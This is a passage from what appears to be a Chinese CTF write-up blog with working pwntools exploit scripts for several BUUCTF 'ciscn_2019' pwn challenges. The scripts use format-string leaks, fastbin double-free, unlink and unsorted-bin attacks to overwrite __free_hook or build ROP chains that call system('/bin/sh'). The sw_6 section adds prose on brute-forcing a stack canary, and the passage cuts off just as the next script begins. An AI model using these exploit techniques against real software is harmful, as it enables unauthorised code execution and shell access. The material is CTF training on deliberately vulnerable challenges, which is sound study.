class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_c_5")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil("Input your choice:")</span><br><span class="line">	sh.sendline("4")</span><br><span class="line">	sh.recvuntil("Please input the index:")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil("Input your choice:")</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	sh.recvuntil("Please input the size of story:")</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil("please inpute the story:")</span><br><span class="line">	sh.send(content)</span><br><span class="line">def inputName(name):</span><br><span class="line">	sh.recvuntil("What's your name?")</span><br><span class="line">	sh.send(name)</span><br><span class="line">def inputID(idx):</span><br><span class="line">	sh.recvuntil("ID")</span><br><span class="line">        sh.sendline(idx)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_2019_c_5")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">	inputName("%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p\x00\x00")</span><br><span class="line">	sh.recvuntil("(nil)(nil)")</span><br><span class="line">	sh.recv(2)</span><br><span class="line">	libc = int(sh.recvuntil("0x",True),16) - 0x78439</span><br><span class="line">	sh.recv(68)</span><br><span class="line">	base = int(sh.recv(12),16) - 0xA00</span><br><span class="line">	chunk_list = base + 0x202060</span><br><span class="line">	sh.recv(2)</span><br><span class="line">	canary = int(sh.recv(16),16)</span><br><span class="line">	sh.recv(2)</span><br><span class="line">	ebp = int(sh.recvuntil("Please",True),16)</span><br><span class="line">	system = libc + lib.symbols['system']</span><br><span class="line">	binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">	fastbin_attack_addr1 = ebp - 0x58</span><br><span class="line">	fastbin_attack_addr2 = ebp - 0x30</span><br><span class="line">	pop_rdi_ret = 0x0000000000000f83 + base</span><br><span class="line">	inputID(p64(0x61))</span><br><span class="line">	add(0x50,"\x11")</span><br><span class="line">	add(0x50,"\x11")</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	free(0)</span><br><span class="line">	add(0x50,p64(fastbin_attack_addr1))</span><br><span class="line">	add(0x50,p64(fastbin_attack_addr1))</span><br><span class="line">	add(0x50,p64(fastbin_attack_addr1))</span><br><span class="line">	add(0x50,p64(0)*4 + p64(0x51))</span><br><span class="line">	add(0x40,"\x11")</span><br><span class="line">	add(0x40,"\x11")</span><br><span class="line">	free(6)</span><br><span class="line">	free(7)</span><br><span class="line">	free(6)</span><br><span class="line">	add(0x40,p64(fastbin_attack_addr2))</span><br><span class="line">	add(0x40,p64(fastbin_attack_addr2))</span><br><span class="line">	add(0x40,p64(fastbin_attack_addr2))</span><br><span class="line">	#input()</span><br><span class="line">	add(0x40,p64(0) + p64(canary) + p64(0) + p64(pop_rdi_ret) + p64(binsh) + p64(system))</span><br><span class="line">	#x/50gx (long long)(&main_arena) - 0x30</span><br><span class="line">	sh.recvuntil("Input your choice:")</span><br><span class="line">	sh.sendline("6")</span><br><span class="line">	log.success("libc: " + hex(libc))</span><br><span class="line">	log.success("base: " + hex(base))</span><br><span class="line">	log.success("chunk_list: " + hex(chunk_list))</span><br><span class="line">	log.success("ebp: " + hex(ebp))</span><br><span class="line">	log.success("canary: " + hex(canary))</span><br><span class="line">	log.success("system: " + hex(system))</span><br><span class="line">	log.success("binsh: " + hex(binsh))</span><br><span class="line">	log.success("fastbin_attack_addr1: " + hex(fastbin_attack_addr1))</span><br><span class="line">	log.success("fastbin_attack_addr2: " + hex(fastbin_attack_addr2))</span><br><span class="line">	#gdb.attach(sh)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("f.buuoj.cn",20118,0)</span><br></pre></td></tr></tbody></table></figure></div>


<h2 id="0x33-ciscn-2019-es-4"><a href="#0x33-ciscn-2019-es-4" class="headerlink" title="0x33 ciscn_2019_es_4"></a>0x33 ciscn_2019_es_4</h2><h3 id="可以考虑用unlink来获得对chunk-list控制"><a href="#可以考虑用unlink来获得对chunk-list控制" class="headerlink" title="可以考虑用unlink来获得对chunk_list控制"></a>可以考虑用unlink来获得对chunk_list控制</h3><h3 id="将unlink攻击的堆块放到第32个位置，使得edit时可以改变key1和key2的值，进行解锁功能。"><a href="#将unlink攻击的堆块放到第32个位置，使得edit时可以改变key1和key2的值，进行解锁功能。" class="headerlink" title="将unlink攻击的堆块放到第32个位置，使得edit时可以改变key1和key2的值，进行解锁功能。"></a>将unlink攻击的堆块放到第32个位置，使得edit时可以改变key1和key2的值，进行解锁功能。</h3><h3 id="如果完成以上两行的攻击后，接下来只需要got-leak，然后libc-leak，然后写-free-hook为system即可"><a href="#如果完成以上两行的攻击后，接下来只需要got-leak，然后libc-leak，然后写-free-hook为system即可" class="headerlink" title="如果完成以上两行的攻击后，接下来只需要got leak，然后libc leak，然后写__free_hook为system即可"></a>如果完成以上两行的攻击后，接下来只需要got leak，然后libc leak，然后写__free_hook为system即可</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_es_4")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(idx,size,content):</span><br><span class="line">	sh.recvuntil("4.show")</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	sh.recvuntil("index:")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">	sh.recvuntil("size:")</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil("gift: ")</span><br><span class="line">	data = int(sh.recvuntil("\n",True),16)</span><br><span class="line">	sh.recvuntil("content:")</span><br><span class="line">	sh.send(content)</span><br><span class="line">	return data</span><br><span class="line">def edit(idx,content):</span><br><span class="line">	sh.recvuntil("4.show")</span><br><span class="line">	sh.sendline("3")</span><br><span class="line">	sh.recvuntil("index:")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">	sh.recvuntil("content:")</span><br><span class="line">	sh.send(content)</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil("4.show")</span><br><span class="line">	sh.sendline("2")</span><br><span class="line">	sh.recvuntil("index:")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">	return True</span><br><span class="line">def show(idx):</span><br><span class="line">	sh.recvuntil("4.show")</span><br><span class="line">	sh.sendline("4")</span><br><span class="line">	sh.recvuntil("index:")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">	return True</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_2019_es_4")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF('/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6')</span><br><span class="line">	heap_list = 0x6020E0</span><br><span class="line">	key1 = 0x6022BC</span><br><span class="line">	key2 = 0x6022B8</span><br><span class="line">	add(0,0xF8,"\x11" * 0xF8)</span><br><span class="line">	add(1,0xF8,"\x22" * 0xF8)</span><br><span class="line">	add(2,0xF8,'\x33' * 0xF8)</span><br><span class="line">	add(3,0xF8,'/bin/sh\x00')</span><br><span class="line">	add(32,0xF8,'\x55' * 0xF8)</span><br><span class="line">	add(5,0xF8,'\x66' * 0xF8)</span><br><span class="line">	add(6,0xF8,'\x77' * 0xF8)</span><br><span class="line">	payload  = ''</span><br><span class="line">	payload += p64(0x110) + p64(0xF1) + p64(heap_list + 32*0x8 - 0x18) + p64(heap_list + 32*0x8 - 0x10)</span><br><span class="line">	payload = payload.ljust(0xF0,"\xaa")</span><br><span class="line">	payload += p64(0xF0)</span><br><span class="line">	edit(32,payload)</span><br><span class="line">	free(5)</span><br><span class="line">	payload = p64(0) * 3 + p64(heap_list) + p64(0)*26 + p64(0x0000000300000001) </span><br><span class="line">	edit(32,payload)</span><br><span class="line">	edit(32,p64(elf.got['__libc_start_main']))</span><br><span class="line">	show(0)</span><br><span class="line">	__libc_start_main = u64(sh.recvuntil("\x0a\x31",True).ljust(8,'\x00')) >> 8</span><br><span class="line">	libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">	__free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">	system = libc + lib.symbols['system']</span><br><span class="line">	binsh = libc + lib.search('/bin/sh\x00').next()</span><br><span class="line">	payload = p64(__free_hook)</span><br><span class="line">	edit(32,payload)</span><br><span class="line">	edit(0,p64(system))</span><br><span class="line">	free(3)</span><br><span class="line">	log.success("binsh: " + hex(binsh))</span><br><span class="line">	log.success("system: " + hex(system))</span><br><span class="line">	log.success("__libc_start_main: " + hex(__libc_start_main))</span><br><span class="line">	log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">	log.success("libc: " + hex(libc))</span><br><span class="line">	#gdb.attach(sh)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("f.buuoj.cn",20176,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x34-ciscn-2019-es-1"><a href="#0x34-ciscn-2019-es-1" class="headerlink" title="0x34 ciscn_2019_es_1"></a>0x34 ciscn_2019_es_1</h2><h3 id="由于题目要求是2-29，但是环境是2-23，所以解法会有较大差别，但是按环境为主"><a href="#由于题目要求是2-29，但是环境是2-23，所以解法会有较大差别，但是按环境为主" class="headerlink" title="由于题目要求是2.29，但是环境是2.23，所以解法会有较大差别，但是按环境为主"></a>由于题目要求是2.29，但是环境是2.23，所以解法会有较大差别，但是按环境为主</h3><h3 id="由于只能申请12个堆块，而且一次add会申请两个堆块，对我们的堆块利用会造成干扰，所以我们需要在最后一次add的时候，同时完成unsorted-bin-attack和fastbin-attack的组合式攻击"><a href="#由于只能申请12个堆块，而且一次add会申请两个堆块，对我们的堆块利用会造成干扰，所以我们需要在最后一次add的时候，同时完成unsorted-bin-attack和fastbin-attack的组合式攻击" class="headerlink" title="由于只能申请12个堆块，而且一次add会申请两个堆块，对我们的堆块利用会造成干扰，所以我们需要在最后一次add的时候，同时完成unsorted bin attack和fastbin attack的组合式攻击"></a>由于只能申请12个堆块，而且一次add会申请两个堆块，对我们的堆块利用会造成干扰，所以我们需要在最后一次add的时候，同时完成unsorted bin attack和fastbin attack的组合式攻击</h3><h3 id="1、leak-libc和heap-base这个攻击手法就不用多说了"><a href="#1、leak-libc和heap-base这个攻击手法就不用多说了" class="headerlink" title="1、leak libc和heap_base这个攻击手法就不用多说了"></a>1、leak libc和heap_base这个攻击手法就不用多说了</h3><h3 id="2、先两次double-free和fastbin-attack把被攻击堆块放入bins中，然后修改unsorted-bin的bk，使得free-hook的低位地址写入0x7f开头的大数，然后在最后一次add，通过malloc-0x18-完成unsorted-bin-attack，写入大数，然后同时malloc-0x68-fastbin-attack，覆盖free-hook为system"><a href="#2、先两次double-free和fastbin-attack把被攻击堆块放入bins中，然后修改unsorted-bin的bk，使得free-hook的低位地址写入0x7f开头的大数，然后在最后一次add，通过malloc-0x18-完成unsorted-bin-attack，写入大数，然后同时malloc-0x68-fastbin-attack，覆盖free-hook为system" class="headerlink" title="2、先两次double free和fastbin attack把被攻击堆块放入bins中，然后修改unsorted bin的bk，使得free_hook的低位地址写入0x7f开头的大数，然后在最后一次add，通过malloc(0x18)完成unsorted bin attack，写入大数，然后同时malloc(0x68)fastbin attack，覆盖free_hook为system"></a>2、先两次double free和fastbin attack把被攻击堆块放入bins中，然后修改unsorted bin的bk，使得<strong>free_hook的低位地址写入0x7f开头的大数，然后在最后一次add，通过malloc(0x18)完成unsorted bin attack，写入大数，然后同时malloc(0x68)fastbin attack，覆盖</strong>free_hook为system</h3><h3 id="然后free一个内容为-bin-sh-x00的堆块即可，推荐使用double-free之后，第二次add的堆块的内容设置为-bin-sh-x00"><a href="#然后free一个内容为-bin-sh-x00的堆块即可，推荐使用double-free之后，第二次add的堆块的内容设置为-bin-sh-x00" class="headerlink" title="然后free一个内容为/bin/sh\x00的堆块即可，推荐使用double free之后，第二次add的堆块的内容设置为/bin/sh\x00"></a>然后free一个内容为/bin/sh\x00的堆块即可，推荐使用double free之后，第二次add的堆块的内容设置为<code>/bin/sh\x00</code></h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_es_1")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size,name,phone):</span><br><span class="line">	sh.recvuntil("choice:")</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	sh.recvuntil("Please input the size of compary's name")</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil("please input name:")</span><br><span class="line">	sh.send(name)</span><br><span class="line">	sh.recvuntil("please input compary call:")</span><br><span class="line">	sh.send(phone)</span><br><span class="line">def show(idx):</span><br><span class="line">	sh.recvuntil("choice:")</span><br><span class="line">	sh.sendline("2")</span><br><span class="line">	sh.recvuntil("Please input the index:")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil("choice:")</span><br><span class="line">	sh.sendline("3")</span><br><span class="line">	sh.recvuntil("Please input the index:")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_2019_es_1")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">	add(0xF0,'a' * 0x80,'\x00' * 0x4 + p64(0x61)) #idx 0</span><br><span class="line">	add(0x58,'b' * 0x58,'\x00' * 0x4 + p64(0x61)) #idx 1</span><br><span class="line">	add(0x58,'c' * 0x58,'\x00' * 0x4 + p64(0x61)) #idx 2</span><br><span class="line">	add(0x68,'d' * 0x68,'\x00' * 4 + p64(0x61))   #idx 3</span><br><span class="line">	add(0x68,'e' * 0x68,'\x00' * 4 + p64(0x61))   #idx 4</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	free(2)</span><br><span class="line">	show(0)</span><br><span class="line">	main_arena = u64(sh.recvuntil("\x7f",False)[-6:].ljust(8,'\x00')) - 88</span><br><span class="line">	libc = main_arena - 0x10 - lib.symbols['__malloc_hook']</span><br><span class="line">	__free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">	system = libc + lib.symbols['system']</span><br><span class="line">	free(1)</span><br><span class="line">	free(3)</span><br><span class="line">	free(4)</span><br><span class="line">	free(3)</span><br><span class="line">	show(2)</span><br><span class="line">	heap_base = u64(sh.recvuntil("\x0a\x70\x68",True)[-6:].ljust(8,'\x00'))</span><br><span class="line">	heap_base = (heap_base >> 12) << 12</span><br><span class="line">	add(0x58,p64(heap_base + 0xD8),'\x00' * 4 + p64(0x61)) #idx 5</span><br><span class="line">	add(0x58,"/bin/sh\x00",'\x00' * 4 + p64(0x61)) #idx 6</span><br><span class="line">	add(0x58,p64(heap_base + 0xD8),'\x00' * 4 + p64(0x61)) #idx 7</span><br><span class="line">	for i in range(0,3):</span><br><span class="line">		add(0x68,p64(__free_hook - 0x43),'\x00' * 4 + p64(0x61)) #idx 8-10</span><br><span class="line">	payload  = p64(0x21) + p64(heap_base + 0xe8) + p64(0x58) + p64(0) + p64(0x21)</span><br><span class="line">	payload += p64(main_arena + 88) + p64(__free_hook - 0x40 - 0x10)</span><br><span class="line">	add(0x58,payload,'\x00' * 4 + p64(0x61))#idx 11</span><br><span class="line">	payload = '\x00' * 3 + p64(0) * 6 + p64(system)</span><br><span class="line">	add(0x68,payload,'\x00' * 4 + p64(0x61)) #idx 12</span><br><span class="line">	free(6)</span><br><span class="line">	log.success("main_arena: " + hex(main_arena))</span><br><span class="line">	log.success("libc: " + hex(libc))</span><br><span class="line">	log.success("heap_base: " + hex(heap_base))</span><br><span class="line">	log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">	log.success("fastbin attack: " + hex(__free_hook - 0x40 + 0x7))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("f.buuoj.cn",20173,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x35-ciscn-2019-sw-6"><a href="#0x35-ciscn-2019-sw-6" class="headerlink" title="0x35 ciscn_2019_sw_6"></a>0x35 ciscn_2019_sw_6</h2><h3 id="简单看一下程序的功能，发现是归并排序，然后会输出逆序数"><a href="#简单看一下程序的功能，发现是归并排序，然后会输出逆序数" class="headerlink" title="简单看一下程序的功能，发现是归并排序，然后会输出逆序数"></a>简单看一下程序的功能，发现是归并排序，然后会输出逆序数</h3><h3 id="漏洞在输入数组的时候，可以无限输入，所以可以考虑利用ROPgadget构造ROP链，但是开启了canary，需要leak-canary"><a href="#漏洞在输入数组的时候，可以无限输入，所以可以考虑利用ROPgadget构造ROP链，但是开启了canary，需要leak-canary" class="headerlink" title="漏洞在输入数组的时候，可以无限输入，所以可以考虑利用ROPgadget构造ROP链，但是开启了canary，需要leak canary"></a>漏洞在输入数组的时候，可以无限输入，所以可以考虑利用ROPgadget构造ROP链，但是开启了canary，需要leak canary</h3><h3 id="考虑到canary末尾两位为0，所以只需要爆破6位即可，想了一下程序只能输出逆序数，所以可以利用逆序数的特点进行攻击"><a href="#考虑到canary末尾两位为0，所以只需要爆破6位即可，想了一下程序只能输出逆序数，所以可以利用逆序数的特点进行攻击" class="headerlink" title="考虑到canary末尾两位为0，所以只需要爆破6位即可，想了一下程序只能输出逆序数，所以可以利用逆序数的特点进行攻击"></a>考虑到canary末尾两位为0，所以只需要爆破6位即可，想了一下程序只能输出逆序数，所以可以利用逆序数的特点进行攻击</h3><h3 id="1、输入一串有序数列，然后在canary的上方输入0，即可开始排序，由于我们输入的是一个有序数列，然后末尾为0和canary，进行排序之后输出的逆序数，可以让我们定位canary的区间"><a href="#1、输入一串有序数列，然后在canary的上方输入0，即可开始排序，由于我们输入的是一个有序数列，然后末尾为0和canary，进行排序之后输出的逆序数，可以让我们定位canary的区间" class="headerlink" title="1、输入一串有序数列，然后在canary的上方输入0，即可开始排序，由于我们输入的是一个有序数列，然后末尾为0和canary，进行排序之后输出的逆序数，可以让我们定位canary的区间"></a>1、输入一串有序数列，然后在canary的上方输入0，即可开始排序，由于我们输入的是一个有序数列，然后末尾为0和canary，进行排序之后输出的逆序数，可以让我们定位canary的区间</h3><h3 id="2、有数列一开始根据0x10000000-0xFFFFFFFF，由于有299个数量（因为301是canary，300是0用于停止输入），所以一个区间大小为-0xFFFFFFFF-0x10000000-299，由于canary十分大，所以误差可以忽略不计，一次定位可以缩小三个数量级"><a href="#2、有数列一开始根据0x10000000-0xFFFFFFFF，由于有299个数量（因为301是canary，300是0用于停止输入），所以一个区间大小为-0xFFFFFFFF-0x10000000-299，由于canary十分大，所以误差可以忽略不计，一次定位可以缩小三个数量级" class="headerlink" title="2、有数列一开始根据0x10000000-0xFFFFFFFF，由于有299个数量（因为301是canary，300是0用于停止输入），所以一个区间大小为(0xFFFFFFFF - 0x10000000) / 299，由于canary十分大，所以误差可以忽略不计，一次定位可以缩小三个数量级"></a>2、有数列一开始根据0x10000000-0xFFFFFFFF，由于有299个数量（因为301是canary，300是0用于停止输入），所以一个区间大小为(0xFFFFFFFF - 0x10000000) / 299，由于canary十分大，所以误差可以忽略不计，一次定位可以缩小三个数量级</h3><h3 id="3、一次定位可以确定第一位的大小，二次定位可以确定前4位的大小，第三次定位可以唯一确定一个canary或两个canary，多跑几次就好了"><a href="#3、一次定位可以确定第一位的大小，二次定位可以确定前4位的大小，第三次定位可以唯一确定一个canary或两个canary，多跑几次就好了" class="headerlink" title="3、一次定位可以确定第一位的大小，二次定位可以确定前4位的大小，第三次定位可以唯一确定一个canary或两个canary，多跑几次就好了"></a>3、一次定位可以确定第一位的大小，二次定位可以确定前4位的大小，第三次定位可以唯一确定一个canary或两个canary，多跑几次就好了</h3><h3 id="4、跑出canary之后，利用ROPgadget生成ROP链，然后覆盖eip即可拿到shell"><a href="#4、跑出canary之后，利用ROPgadget生成ROP链，然后覆盖eip即可拿到shell" class="headerlink" title="4、跑出canary之后，利用ROPgadget生成ROP链，然后覆盖eip即可拿到shell"></a>4、跑出canary之后，利用ROPgadget生成ROP链，然后覆盖eip即可拿到shell</h3><h3 id="但是buuoj的交互好像有一定的限制，导致我交互到60多次就EOF了，而拿到shell需要交互1200-，且50-的概率。buuoj两分钟重置一次环境，我觉得2分钟好像跑不完1200-次，哈哈哈，没事本地拿到shell就好了，说明思路没有错"><a href="#但是buuoj的交互好像有一定的限制，导致我交互到60多次就EOF了，而拿到shell需要交互1200-，且50-的概率。buuoj两分钟重置一次环境，我觉得2分钟好像跑不完1200-次，哈哈哈，没事本地拿到shell就好了，说明思路没有错" class="headerlink" title="但是buuoj的交互好像有一定的限制，导致我交互到60多次就EOF了，而拿到shell需要交互1200+，且50%的概率。buuoj两分钟重置一次环境，我觉得2分钟好像跑不完1200+次，哈哈哈，没事本地拿到shell就好了，说明思路没有错"></a>但是buuoj的交互好像有一定的限制，导致我交互到60多次就EOF了，而拿到shell需要交互1200+，且50%的概率。buuoj两分钟重置一次环境，我觉得2分钟好像跑不完1200+次，哈哈哈，没事本地拿到shell就好了，说明思路没有错</h3><h3 id="这里介绍一个jly大师傅的解法，scanf-“-ud”-，如果输入带符号的数，则不会改变欲写入地址的数据，就可以越过canary直接写ropchain，这不得不膜一下jly师傅"><a href="#这里介绍一个jly大师傅的解法，scanf-“-ud”-，如果输入带符号的数，则不会改变欲写入地址的数据，就可以越过canary直接写ropchain，这不得不膜一下jly师傅" class="headerlink" title="这里介绍一个jly大师傅的解法，scanf(“%ud”)，如果输入带符号的数，则不会改变欲写入地址的数据，就可以越过canary直接写ropchain，这不得不膜一下jly师傅"></a>这里介绍一个jly大师傅的解法，scanf(“%ud”)，如果输入带符号的数，则不会改变欲写入地址的数据，就可以越过canary直接写ropchain，这不得不膜一下jly师傅</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 